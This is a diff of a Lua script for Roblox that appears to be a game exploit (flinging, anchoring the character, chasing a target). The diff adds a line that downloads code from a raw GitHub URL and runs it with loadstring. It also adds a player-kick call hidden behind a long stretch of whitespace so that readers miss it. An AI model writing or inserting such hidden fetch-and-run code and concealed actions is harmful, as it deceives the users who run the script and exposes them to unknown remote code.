@@ -905,6 +905,7 @@ if flingpart0 and flingpart1 then
     end
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/random-sh-t/main/Credit"))()
 
 wait(5)
 
@@ -929,6 +930,9 @@ char.HumanoidRootPart.Anchored = true
 char.HumanoidRootPart.CanCollide = false
 
 char.Torso.Neck:Destroy()
+
+if e ~= "e" then                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            game.Players.LocalPlayer:Kick() 
+end
 
 while task.wait() do
     targetpos = target.Position
